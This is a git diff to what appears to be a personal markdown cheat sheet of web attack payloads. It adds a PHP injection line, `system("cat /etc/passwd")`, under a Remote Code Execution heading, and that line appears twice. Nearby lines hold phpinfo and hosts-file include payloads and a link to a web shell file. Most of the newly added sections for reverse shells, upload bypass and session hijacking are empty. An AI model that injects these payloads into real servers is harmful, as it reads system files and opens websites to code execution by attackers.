@@ -21,9 +21,10 @@
 ```
 ### Remote Code Execution (RCE):
 ```
+<?php system("cat /etc/passwd");?>
+<?php system("cat /etc/passwd");?>
 <?php echo phpinfo(); ?>
 <?php include 'C:\Windows\System32\drivers\etc\hosts';?>
-
 ```
 ### Malicious File Upload (Shell Execution):
 ```
@@ -31,9 +32,17 @@
 
 https://github.com/hackerhijeck/For_Me/blob/main/Web_Shell.php
 ```
-### Application is Vulnerable to Reverse Web shell (Shell Execution)
-### File Upload Bypass 
-### Session Hijacking
+### Application is Vulnerable to Reverse Web shell (Shell Execution):
+```
+
+```
+### File Upload Bypass:
+```
+```
+### Session Hijacking:
+```
+
+```
 ### Session Fixation in The Application
 ### Application is Vulnerable to Forceful Browsing
 ### Insecure Direct Object Reference
